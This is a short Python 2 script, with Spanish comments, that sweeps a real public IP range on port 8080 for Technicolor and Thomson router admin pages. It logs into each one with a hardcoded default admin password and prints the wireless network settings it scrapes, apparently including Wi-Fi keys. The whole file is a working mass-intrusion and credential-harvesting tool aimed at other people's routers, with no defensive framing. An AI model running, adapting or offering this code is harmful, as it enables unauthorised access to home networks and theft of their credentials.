# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import json
ip="181.63.179."
tech=0
tom=0
for i in range(0,256):
    try:
        r1=requests.get('http://'+ip+str(i)+':8080/', timeout=0.3)
        head=r1.headers
        b='WWW-Authenticate' in head
        if b==True:
            r=requests.get('http://'+ip+str(i)+':8080/', timeout=0.3)
            n=r.headers['WWW-Authenticate']=='Basic realm="Technicolor"'
            if n==True: ##Technicolor
                tech=tech+1
                print ip+str(i)+"..................Technicolor.........."
                r2=requests.get('http://'+ip+str(i)+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.3)
                parser1=r2.content
                bs1=BeautifulSoup(parser1, "html.parser")
                for td in bs1.find_all("td", align="middle"):
                    print ip+str(i)+"..................Technicolor.........."+td.text[16:]
            else: ##Thomson
                tom=tom+1
                print ip+str(i)+"..................Thomson....."
                r2=requests.get('http://'+ip+str(i)+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=0.3)
                parser=r2.content
                bs=BeautifulSoup(parser, "html.parser")
                for td in bs.find_all("td", align="middle"):
                    print ip+str(i)+"..................Thomson....."+td.text[16:]
                
           
                
            
    except requests.exceptions.ConnectTimeout:
        pass
    except requests.exceptions.ReadTimeout:
        pass
    except requests.exceptions.ConnectionError:
        pass
    except KeyError:
        pass
#print "Se ha logrado logear en "+str(count)+" hosts"
print str(tech)+" technicolor"
print str(tom)+" tomson"
print str(tech+tom)+" En total"
    
	
